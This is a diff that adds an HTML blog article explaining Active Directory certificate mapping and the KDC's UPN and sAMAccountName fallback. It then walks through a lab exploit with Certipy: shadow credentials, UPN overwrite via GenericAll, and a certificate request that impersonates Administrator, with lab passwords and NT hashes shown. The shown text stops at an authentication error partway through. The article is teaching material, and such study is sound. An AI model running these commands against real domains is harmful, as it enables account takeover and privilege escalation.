@@ -1,0 +1,753 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AD - Certificate Services (Part 2)</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">
+    <link href="/css/articles.css" rel="stylesheet">
+    <link href="/css/styles.css" rel="stylesheet">
+    <link href="/css/monokai.css" rel="stylesheet">
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
+</head>
+<body>
+    <button class="sidebar-toggle" id="sidebarToggle">☰</button>
+    <div class="container-fluid">
+        <div class="row">
+            <!-- Sidebar -->
+            <aside class="sidebar">
+                <div class="sidebar-logo">
+                    <img src="/img/new-logo.png" alt="Logo">
+                    <h3>elswix</h3>
+                </div>
+                <nav>
+                    <ul class="nav flex-column">
+                        <li class="nav-item"><a href="/" class="nav-link active"><i class="bi bi-house-door"></i> Home</a></li>
+                        <li class="nav-item"><a href="/articles" class="nav-link"><i class="bi bi-card-text"></i> Articles</a></li>
+                        <li class="nav-item"><a href="/writeups" class="nav-link"><i class="bi bi-terminal"></i> WriteUPs</a></li>
+                        <li class="nav-item"><a href="/notes" class="nav-link"><i class="bi bi-journal-text"></i> Notes</a></li>
+                        <li class="nav-item"><a href="https://github.com/elswix/KL-Sunset" target="_blank" class="nav-link"><i class="bi bi-github"></i> KL-Sunset</a></li>
+                        <li class="nav-item"><a href="/about" class="nav-link"><i class="bi bi-person"></i> About me</a></li>
+                    </ul>
+                </nav>
+            </aside>
+            <!-- Main Content -->
+            <main>
+                <!-- Hero Section -->
+                <section class="hero mb-5">
+                    <img src="/img/articles/logo18.png" alt="index-logo" class="mb-3" style="width: 120px; height: 120px; border-radius: 50%">
+                    <h2>AD - Certificate Services (Part 2)</h2>
+                    <p>Certificate mapping, Certifried and more</p>
+                </section>
+                <section class="article-content">
+                    <div class="article-container">
+                        <div class="article-content-main">
+                           <h3>Introduction</h3><br/>
+<p>In the previous article, we have introduced Active Directory Certificate Services (ADCS) and how it operates to implement PKI in Active Directory. We focused on how ADCS allows us to utilize PKINIT Authentication for Kerberos and how ADCS misconfigurations could lead to account persistence, Domain Escalation and Domain Persistence.</p><br/>
+<p>Nowadays, some of the techniques discussed in the previous article might not be possible to abuse nowadays. After the <strong><a href="https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4">CVE-2022–26923 (Certifried)</a></strong> vulnerability, which we will discuss later, Microsoft implemented many security measures that makes ADCS exploitation harder.</p><br/>
+<p>Today, we will delve into how <strong>Certificate Mapping</strong> works, which security measurements were implemented after the Certifried vulnerability and more.</p><br/>
+<h3>Kerberos PKINIT Authentication Process</h3><br/>
+<p>Before starting with <strong>Certificate Mapping</strong>, let's recall the Kerberos PKINIT Authentication Process.</p><br/>
+<h3>Certificate Request</h3><br/>
+<p>Let's start with the certificate request, which involves creating a public/private key pair and then, send a CSR with the public key. The following image, representates the Certificate Request process.</p><br/>
+<p><img src="https://elswix.github.io/articles/17/img/Cert-Services-2.png"/>
+To sum up, the client generates a private/public key pair, then creates a Certificate Signing Request (CSR), which specifies like settings that the issued certificate must contain, like the Template and EKUs, and inserts the generated public key inside it, then sends the CSR to the Certification Authority. When the CA receives the CSR, it starts a verification process to determine whether a certification must be issued or not.</p><br/>
+<p>Some of the most importants checks are the following:
++ Does the specified certificate template exist?
++ Are the settingsi n the CSR allowed by the tempalte? (for example, the specified EKU)
++ Is the client who send the CSR allowed to enroll for a certificate?</p><br/>
+<p>Among other checks. </p><br/>
+<p>Finally, if the verification is successful, the Certificate Authority (CA) issues a certificate based on the options specified in the Certificate Signing Request (CSR). It includes the Subject’s User Principal Name (UPN) in the Subject Alternative Name (SAN) field—since Kerberos uses the SAN to map the certificate to a user—and embeds the user's public key within the certificate. This public key will later be used to verify that the certificate is being used by the rightful user to whom it was issued. Then, the CA returns the newly issued certificate to the client, who stores it in the Windows Certificate Store upon receipt, enabling its use for future authentication (in this case).</p><br/>
+<h3>Kerberos PKINIT Authentication</h3><br/>
+<p>Upon obtaining the certificate, it can be used to perform Kerberos Authentication using PKINIT. Remember that this is due the specified template (the User template), has the <strong>Client Authentication EKU</strong> (other EKUs may also enable authentication, but many of them don't). </p><br/>
+<p>The following image representates a <code>KRB_AS_REQ</code> request through PKINIT:</p><br/>
+<p><img src="https://elswix.github.io/articles/17/img/Cert-Services-3.png"/> 
+The authentication process is fairly similar to the usual Kerberos Authentication flow, however, in this case, an extra certificate is included within the AS_REQ request, which will provide the necesary information to verify the timestamp.</p><br/>
+<p>Once the KDC receives the request, it takes the certificate and performs some checks against the certificate data. For example, it checks whether the specified username matches the Subject Alternative Name (SAN) attribute of the certificate. It also checks whether the certificate's <strong>EKU</strong> allows authentication, which in this case, it does, since its <strong>Client Authentication</strong>. </p><br/>
+<p>Then, the KDC also verifies whether the certificate was issued from a trusted CA, this means that the certificate signature will be checked against a trust chain which should end with the RootCA certificate signature, also, the issuer CA must be inside the NTAuthCertificates container, otherwise it won't be allowed for authentication. </p><br/>
+<p>The timestamp value serves as preauthentication data, which is encrypted using the private key previously generated by the client. Since the certificate includes the corresponding public key, the KDC can extract this public key from the certificate and attempt to decrypt the timestamp. If successful, it indicates that the client possesses the corresponding private key associated with the public key, thereby confirming that the authentication message is valid and originates from a trusted source—since only the client holds the matching private key.</p><br/>
+<h3>Implicit vs Explicit Certificate Mapping</h3><br/>
+<p>There are two primary methods by which a certificate can be mapped to a user account for authentication in Active Directory: <strong>Implicit</strong> and <strong>Explicit</strong> mapping.</p><br/>
+<p><strong>Implicit mapping</strong> is the most common and straightforward method. In this mode, the Key Distribution Center (KDC) automatically derives the user account by examining the contents of the certificate—specifically, the <strong>User Principal Name (UPN)</strong> stored in the <strong>Subject Alternative Name (SAN)</strong> field. The KDC searches for a user in Active Directory whose <code>userPrincipalName</code> matches the UPN found in the certificate. If a match is found and all validation checks pass (such as certificate trust, revocation status, and validity period), a Ticket Granting Ticket (TGT) is issued for that user. </p><br/>
+<p><strong>Explicit mapping</strong>, on the other hand, involves a more deliberate configuration. Here, the association between a certificate and a user account is explicitly defined—usually by populating the <strong>altSecurityIdentities</strong> attribute on the user object in Active Directory. This attribute can be configured with identifiers such as the certificate's subject and issuer, allowing the KDC to map the certificate even if the UPN is missing or does not match any user directly. Explicit mapping allows more granular control but introduces administrative overhead and, as we’ll explore in future articles, can be abused in certain attack scenarios such as <strong>ESC14</strong>, a technique that leverages this mapping mechanism for privilege escalation.</p><br/>
+<p>In this article, we'll focus exclusively on <strong>implicit mapping</strong>, particularly how it works in Kerberos authentication using certificates and why it's the default behavior in most Active Directory environments. We'll leave the deeper dive into <strong>explicit mapping</strong>, including its security implications and abuse cases, for a future article where we analyze <strong>ESC14</strong> in detail.</p><br/>
+<h3>Implicit mapping process</h3><br/>
+<p>In the <strong>implicit mapping</strong> process, the <strong>Key Distribution Center (KDC)</strong> uses information embedded within the certificate—specifically the <strong>Subject Alternative Name (SAN)</strong> field—to map the certificate to a user account in <strong>Active Directory</strong>.</p><br/>
+<p>During the <strong>certificate validation stage</strong> of the Kerberos authentication process, the KDC extracts the <strong>User Principal Name (UPN)</strong> from the SAN extension of the certificate. This UPN is expected to match the <code>userPrincipalName</code> attribute of an account in the domain. If the KDC finds a user (or computer) account whose UPN matches exactly, and the certificate passes all cryptographic and trust validations, it will issue a <strong>Ticket Granting Ticket (TGT)</strong> for that account, successfully completing the initial Kerberos authentication.</p><br/>
+<p>If the certificate belongs to a <strong>computer account</strong>, the SAN typically contains the <strong><code>dNSHostName</code></strong> instead of a UPN. In this case, the KDC performs a lookup against the <code>dNSHostName</code> attribute in Active Directory. If a computer account with a matching DNS name is found and the certificate is valid, the process proceeds the same way—resulting in the issuance of a TGT for the computer account.</p><br/>
+<p>But what happens if there’s <strong>no account</strong> in Active Directory that matches the UPN (for users) or <code>dNSHostName</code> (for computers) exactly?</p><br/>
+<p>The KDC will attempt a <strong>fallback search strategy</strong>. It parses the UPN, which typically follows this format:</p><br/>
+<div class="highlight"><pre><span></span><span class="n">user</span><span class="n">@domain</span><span class="o">.</span><span class="n">local</span>
+</pre></div>
+<p>The first portion of the UPN—<code>user</code>—is interpreted as a <strong>username</strong>, and in many environments, it often matches the value of the <code>sAMAccountName</code> attribute on the user object. The KDC will take this portion and perform a secondary search, this time looking for any object in Active Directory (user or computer) where <code>sAMAccountName = "user"</code>.</p><br/>
+<p>Once again, if the KDC fails to find a matching user account using the <code>sAMAccountName</code>, it will attempt one more fallback: it <strong>appends a <code>$</code> to the name</strong>, for example, <code>user$</code>, which is the typical format for <strong>computer accounts</strong> in Active Directory. This allows the KDC to check whether the certificate corresponds to a <strong>computer object</strong>, which also participates in Kerberos authentication.</p><br/>
+<p>It's important to note that the <code>sAMAccountName</code> attribute <strong>cannot be empty</strong> in Active Directory. Therefore, this lookup process won't inherently fail unless the specified account—whether user or computer—<strong>does not exist</strong> (e.g., it was deleted or never created).</p><br/>
+<p>So, to sum up: initially, the KDC extracts the <strong>UPN</strong> from the <strong>SAN</strong> field of the certificate and searches for an account in Active Directory with a matching <code>userPrincipalName</code>. If that search fails, the KDC splits the UPN into two parts and takes the <strong>username portion</strong> (the part before the <code>@</code>). It then performs a lookup using the <code>sAMAccountName</code> attribute to find an account with a matching value. If this also fails, the KDC appends a <strong><code>$</code></strong> to the username—forming something like <code>user$</code>—and attempts to find a <strong>computer account</strong> with that <code>sAMAccountName</code>. Finally, if none of these lookups succeed, the KDC concludes that the client specified in the certificate <strong>does not exist</strong> in Active Directory, and the authentication request fails.</p><br/>
+<p>Implicit mapping also works when a DNS name is provided in the SAN (Subject Alternative Name) extension. In this case, the Domain Controller first checks whether any machine account has its <code>dNSHostName</code> attribute set to the value supplied in the certificate. (Note: user accounts do not have this attribute.)</p><br/>
+<p>If no match is found, the DC splits the DNS name into two parts: one for the computer name and one for the domain name. It then appends a <code>$</code> to the computer name and tries to find an account whose <code>sAMAccountName</code> matches the result.</p><br/>
+<h3>Example</h3><br/>
+<p>Now, let's put these concepts into practice. For example, let's request a certificate for the administrator user using the <code>User</code> template:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">certipy</span> <span class="n">req</span> <span class="o">-</span><span class="n">u</span> <span class="n">administrator</span> <span class="o">-</span><span class="n">p</span> <span class="n">Password123</span> <span class="o">-</span><span class="n">template</span> <span class="n">User</span> <span class="o">-</span><span class="n">target</span><span class="o">-</span><span class="n">ip</span> <span class="mf">192.168.100.2</span> <span class="o">-</span><span class="n">ca</span> <span class="s1">'elswixcorp-DC02-CA'</span>
+<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Requesting</span> <span class="n">certificate</span> <span class="n">via</span> <span class="n">RPC</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Successfully</span> <span class="n">requested</span> <span class="n">certificate</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Request</span> <span class="n">ID</span> <span class="ow">is</span> <span class="mi">33</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">certificate</span> <span class="k">with</span> <span class="n">UPN</span> <span class="s1">'Administrator@elswixcorp.local'</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Certificate</span> <span class="n">has</span> <span class="n">no</span> <span class="nb">object</span> <span class="n">SID</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Saved</span> <span class="n">certificate</span> <span class="ow">and</span> <span class="n">private</span> <span class="n">key</span> <span class="n">to</span> <span class="s1">'administrator.pfx'</span>
+</pre></div>
+<p>After the certificate is issued, we can see that the <strong>Subject Alternative Name (SAN)</strong> extension of the certificate includes the <strong>UPN</strong> of the <strong>administrator</strong> user.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">openssl</span> <span class="n">pkcs12</span> <span class="o">-</span><span class="ow">in</span> <span class="n">administrator</span><span class="o">.</span><span class="n">pfx</span> <span class="o">-</span><span class="n">out</span> <span class="n">administrator</span><span class="o">.</span><span class="n">pem</span> <span class="o">-</span><span class="n">nodes</span>
+<span class="n">Enter</span> <span class="n">Import</span> <span class="n">Password</span><span class="p">:</span>
+<span class="nd">elswix@ubuntu$</span> <span class="n">openssl</span> <span class="n">x509</span> <span class="o">-</span><span class="ow">in</span> <span class="n">administrator</span><span class="o">.</span><span class="n">pem</span> <span class="o">-</span><span class="n">text</span> <span class="o">-</span><span class="n">noout</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">i</span> <span class="s2">"Subject Alternative Name"</span> <span class="o">-</span><span class="n">A</span> <span class="mi">2</span>
+            <span class="n">X509v3</span> <span class="n">Subject</span> <span class="n">Alternative</span> <span class="n">Name</span><span class="p">:</span> 
+                <span class="n">othername</span><span class="p">:</span> <span class="n">UPN</span><span class="p">::</span><span class="n">Administrator</span><span class="n">@elswixcorp</span><span class="o">.</span><span class="n">local</span>
+</pre></div>
+<p>At this stage, the SAN has a valid UPN that corresponds to the administrator user.</p><br/>
+<p>However, if we examine the <strong>administrator</strong> user’s attributes in Active Directory, we find that the <strong><code>userPrincipalName</code> (UPN)</strong> field is <strong>empty</strong> for this account.</p><br/>
+<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span><span class="o">.</span><span class="n">ELSWIXCORP</span><span class="mf">.000</span>\<span class="n">Documents</span><span class="o">&gt;</span> <span class="n">Get</span><span class="o">-</span><span class="n">AdUser</span> <span class="n">Administrator</span>
+
+
+<span class="n">DistinguishedName</span> <span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">Administrator</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">local</span>
+<span class="n">Enabled</span>           <span class="p">:</span> <span class="kc">True</span>
+<span class="n">GivenName</span>         <span class="p">:</span>
+<span class="n">Name</span>              <span class="p">:</span> <span class="n">Administrator</span>
+<span class="n">ObjectClass</span>       <span class="p">:</span> <span class="n">user</span>
+<span class="n">ObjectGUID</span>        <span class="p">:</span> <span class="mi">2</span><span class="n">dcf5c17</span><span class="o">-</span><span class="n">e0e2</span><span class="o">-</span><span class="mi">4</span><span class="n">c1a</span><span class="o">-</span><span class="mi">9</span><span class="n">f77</span><span class="o">-</span><span class="n">f9cf7bae1b3a</span>
+<span class="n">SamAccountName</span>    <span class="p">:</span> <span class="n">Administrator</span>
+<span class="n">SID</span>               <span class="p">:</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4266111273</span><span class="o">-</span><span class="mi">315482142</span><span class="o">-</span><span class="mi">3017431568</span><span class="o">-</span><span class="mi">500</span>
+<span class="n">Surname</span>           <span class="p">:</span>
+<span class="n">UserPrincipalName</span> <span class="p">:</span>
+</pre></div>
+<p>Despite the fact that the UPN is empty in Active Directory, if you attempt to authenticate as <strong>administrator</strong> using this certificate, <strong>authentication succeeds</strong> without issue.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">certipy</span> <span class="n">auth</span> <span class="o">-</span><span class="n">pfx</span> <span class="n">administrator</span><span class="o">.</span><span class="n">pfx</span> <span class="o">-</span><span class="n">domain</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">192.168.100.2</span>
+<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">principal</span><span class="p">:</span> <span class="n">administrator</span><span class="n">@elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">get</span> <span class="n">TGT</span><span class="o">...</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">TGT</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Saved</span> <span class="n">credential</span> <span class="n">cache</span> <span class="n">to</span> <span class="s1">'administrator.ccache'</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">retrieve</span> <span class="n">NT</span> <span class="nb">hash</span> <span class="k">for</span> <span class="s1">'administrator'</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="nb">hash</span> <span class="k">for</span> <span class="s1">'administrator@elswixcorp.local'</span><span class="p">:</span> <span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">58</span><span class="n">a478135a93ac3bf058a5ea0e8fdb71</span>
+</pre></div>
+<p>This happens because the <strong>Key Distribution Center (KDC)</strong> follows the <strong>implicit mapping process</strong> we described earlier.</p><br/>
+<ul>
+<li>
+<p>When the KDC attempts to map the certificate to an Active Directory account, it first looks at the <strong>UPN</strong> in the SAN extension of the certificate.</p><br/>
+</li>
+<li>
+<p>Since the <strong>administrator</strong> user’s UPN is missing in Active Directory, the KDC cannot find an exact match for the <strong>UPN</strong>.</p><br/>
+</li>
+<li>
+<p>At this point, the KDC splits the UPN into two parts. It extracts the <strong>username portion</strong> from the UPN, which in this case is <strong>administrator</strong>.</p><br/>
+</li>
+<li>
+<p>The KDC then looks for an Active Directory account with a matching <strong><code>sAMAccountName</code></strong> of <strong>administrator</strong>.</p><br/>
+</li>
+<li>
+<p>It successfully finds the <strong>administrator</strong> account, since the <strong><code>sAMAccountName</code></strong> matches, and thus the <strong>authentication is successful</strong>.</p><br/>
+</li>
+</ul>
+<h3>GenericWrite on User</h3><br/>
+<p>Given this behavior, there's an exploitation path that comes to mind. If you have <code>GenericWrite</code>, <code>GenericAll</code>, or any privilege that grants write access to the UPN attribute of a user account, you can exploit the implicit mapping process to escalate privileges. This is similar to what we’ll exploit in ESC10 later on.</p><br/>
+<p><strong>Note:</strong> This scenario applies to an Active Directory environment that has <strong>not</strong> been patched for <strong>Certifried (CVE-2022–26923)</strong>. As we’ll see later, that patch introduces new security measures that prevent many common techniques, including the one demonstrated here.</p><br/>
+<p>To demonstrate how we can abuse implicit mapping, I manually configured a scenario where the user <code>elswix</code> has <code>GenericAll</code> (or alternatively <code>GenericWrite</code>) privileges over the user <code>claire</code>.</p><br/>
+<p>First, let’s assume we have valid credentials for <code>elswix</code>.</p><br/>
+<h3>Strategy</h3><br/>
+<p>Since <code>elswix</code> has <code>GenericAll</code> rights over <code>claire</code>, we can modify her UPN attribute to an arbitrary value. This is powerful because if we set the UPN to something like <code>administrator@elswixcorp.local</code>, or even just <code>administrator</code>, then when requesting a certificate as <code>claire</code>, the UPN in the certificate will be <code>administrator@elswixcorp.local</code> or <code>administrator</code>.</p><br/>
+<p>After that, we reset Claire’s UPN back to its original value, or to any other non-malicious value. This is important because when the KDC performs implicit mapping, it will no longer associate the UPN in the certificate with our low-privileged user <code>claire</code>. Instead, it will associate it with the real Administrator account.</p><br/>
+<p>Keep in mind that the UPN must not already exist in the domain—otherwise, the update will fail. In this particular case, since the Administrator’s UPN attribute is empty by default, you can safely use <code>administrator@elswixcorp.local</code>. However, if you want to impersonate another user, you can set the UPN to just their name, but without using the usual email format—just the <code>sAMAccountName</code> of the target. This works because, as we observed in the implicit mapping process, the KDC will eventually take the UPN and resolve it by searching the <code>sAMAccountName</code> attribute.</p><br/>
+<h3>Exploitation</h3><br/>
+<p>First, let’s add shadow credentials to <code>claire</code>, since we’ll need valid credentials to request a certificate as her:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">certipy</span> <span class="n">shadow</span> <span class="n">auto</span> <span class="o">-</span><span class="n">u</span> <span class="n">elswix</span><span class="n">@elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="o">-</span><span class="n">p</span> <span class="n">Password2</span><span class="n">!</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">192.168.100.2</span> <span class="o">-</span><span class="n">account</span> <span class="n">claire</span>
+<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Targeting</span> <span class="n">user</span> <span class="s1">'claire'</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Generating</span> <span class="n">certificate</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Certificate</span> <span class="n">generated</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Generating</span> <span class="n">Key</span> <span class="n">Credential</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Key</span> <span class="n">Credential</span> <span class="n">generated</span> <span class="k">with</span> <span class="n">DeviceID</span> <span class="s1">'abe28f3b-0dfc-ff07-3860-c11b18a0d010'</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Adding</span> <span class="n">Key</span> <span class="n">Credential</span> <span class="k">with</span> <span class="n">device</span> <span class="n">ID</span> <span class="s1">'abe28f3b-0dfc-ff07-3860-c11b18a0d010'</span> <span class="n">to</span> <span class="n">the</span> <span class="n">Key</span> <span class="n">Credentials</span> <span class="k">for</span> <span class="s1">'claire'</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Successfully</span> <span class="n">added</span> <span class="n">Key</span> <span class="n">Credential</span> <span class="k">with</span> <span class="n">device</span> <span class="n">ID</span> <span class="s1">'abe28f3b-0dfc-ff07-3860-c11b18a0d010'</span> <span class="n">to</span> <span class="n">the</span> <span class="n">Key</span> <span class="n">Credentials</span> <span class="k">for</span> <span class="s1">'claire'</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Authenticating</span> <span class="k">as</span> <span class="s1">'claire'</span> <span class="k">with</span> <span class="n">the</span> <span class="n">certificate</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">principal</span><span class="p">:</span> <span class="n">claire</span><span class="n">@elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">get</span> <span class="n">TGT</span><span class="o">...</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">TGT</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Saved</span> <span class="n">credential</span> <span class="n">cache</span> <span class="n">to</span> <span class="s1">'claire.ccache'</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">retrieve</span> <span class="n">NT</span> <span class="nb">hash</span> <span class="k">for</span> <span class="s1">'claire'</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Restoring</span> <span class="n">the</span> <span class="n">old</span> <span class="n">Key</span> <span class="n">Credentials</span> <span class="k">for</span> <span class="s1">'claire'</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Successfully</span> <span class="n">restored</span> <span class="n">the</span> <span class="n">old</span> <span class="n">Key</span> <span class="n">Credentials</span> <span class="k">for</span> <span class="s1">'claire'</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">NT</span> <span class="nb">hash</span> <span class="k">for</span> <span class="s1">'claire'</span><span class="p">:</span> <span class="mf">140e2</span><span class="n">a025b0a93dc13720d19e935a918</span>
+</pre></div>
+<p>As shown, because I used the <code>auto</code> option in <strong>Certipy</strong>, it also retrieved <code>claire</code>’s NT hash. This allows us to use <strong>Pass-the-Hash</strong> to authenticate as her.</p><br/>
+<p>Now, let’s modify her UPN to match the Administrator’s <code>sAMAccountName</code>:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">certipy</span> <span class="n">account</span> <span class="n">update</span> <span class="o">-</span><span class="n">u</span> <span class="n">elswix</span> <span class="o">-</span><span class="n">p</span> <span class="n">Password2</span><span class="n">!</span> <span class="o">-</span><span class="n">user</span> <span class="n">claire</span> <span class="o">-</span><span class="n">upn</span> <span class="n">administrator</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">192.168.100.2</span>
+<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Updating</span> <span class="n">user</span> <span class="s1">'claire'</span><span class="p">:</span>
+    <span class="n">userPrincipalName</span>                   <span class="p">:</span> <span class="n">administrator</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Successfully</span> <span class="n">updated</span> <span class="s1">'claire'</span>
+</pre></div>
+<p>Perfect—it worked! Notice how we don’t need to use a proper UPN email format; you can simply set it to a name. As long as no other account uses that value, the update will succeed.</p><br/>
+<p>Next, let’s request a certificate using <code>claire</code>’s credentials and the default <strong>User</strong> template:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">certipy</span> <span class="n">req</span> <span class="o">-</span><span class="n">u</span> <span class="n">claire</span> <span class="o">-</span><span class="n">hashes</span> <span class="p">:</span><span class="mf">140e2</span><span class="n">a025b0a93dc13720d19e935a918</span> <span class="o">-</span><span class="n">template</span> <span class="n">User</span> <span class="o">-</span><span class="n">target</span><span class="o">-</span><span class="n">ip</span> <span class="mf">192.168.100.2</span> <span class="o">-</span><span class="n">ca</span> <span class="s1">'elswixcorp-DC02-CA'</span>
+<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Requesting</span> <span class="n">certificate</span> <span class="n">via</span> <span class="n">RPC</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Successfully</span> <span class="n">requested</span> <span class="n">certificate</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Request</span> <span class="n">ID</span> <span class="ow">is</span> <span class="mi">42</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">certificate</span> <span class="k">with</span> <span class="n">UPN</span> <span class="s1">'administrator'</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Certificate</span> <span class="n">has</span> <span class="n">no</span> <span class="nb">object</span> <span class="n">SID</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Saved</span> <span class="n">certificate</span> <span class="ow">and</span> <span class="n">private</span> <span class="n">key</span> <span class="n">to</span> <span class="s1">'administrator.pfx'</span>
+</pre></div>
+<p>Success! As shown, Certipy indicates that the received certificate has <code>administrator</code> set as the UPN in the SAN. Before using it for authentication, we must reset <code>claire</code>’s UPN; otherwise, authentication will fail:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">certipy</span> <span class="n">auth</span> <span class="o">-</span><span class="n">pfx</span> <span class="n">administrator</span><span class="o">.</span><span class="n">pfx</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">192.168.100.2</span> <span class="o">-</span><span class="n">domain</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">principal</span><span class="p">:</span> <span class="n">administrator</span><span class="n">@elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">get</span> <span class="n">TGT</span><span class="o">...</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Name</span> <span class="n">mismatch</span> <span class="n">between</span> <span class="n">certificate</span> <span class="ow">and</span> <span class="n">user</span> <span class="s1">'administrator'</span>
